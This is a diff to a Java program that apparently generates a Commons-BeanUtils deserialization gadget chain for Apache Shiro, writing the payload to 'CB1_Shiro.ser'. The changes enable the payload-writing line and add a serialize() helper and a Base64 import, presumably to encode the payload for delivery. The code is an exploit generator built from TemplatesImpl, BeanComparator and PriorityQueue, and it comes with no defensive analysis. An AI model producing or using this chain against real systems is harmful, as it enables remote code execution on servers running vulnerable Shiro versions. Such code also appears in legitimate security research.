@@ -1,17 +1,13 @@
-import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
-import javassist.ClassClassPath;
 import javassist.ClassPool;
 import javassist.CtClass;
 import org.apache.commons.beanutils.BeanComparator;
-import sun.misc.ASCIICaseInsensitiveComparator;
 
-import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
-import java.io.ObjectInputStream;
 import java.io.ObjectOutputStream;
 import java.lang.reflect.Field;
+import java.util.Base64;
 import java.util.PriorityQueue;
 
 public class Main {
@@ -30,8 +26,14 @@ public class Main {
         setFieldValue(comparator, "property", "outputProperties");
         setFieldValue(queue, "queue", new Object[]{obj, obj});
 
-//        FileStream.writeSer(queue,"CB1_Shiro.ser");
+        FileStream.writeSer(queue,"CB1_Shiro.ser");
         FileStream.readSer("CB1_Shiro.ser");
+    }
+    public static byte[] serialize(Object o) throws Exception{
+        ByteArrayOutputStream barr = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(barr);
+        oos.writeObject(o);
+        return barr.toByteArray();
     }
 
     public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
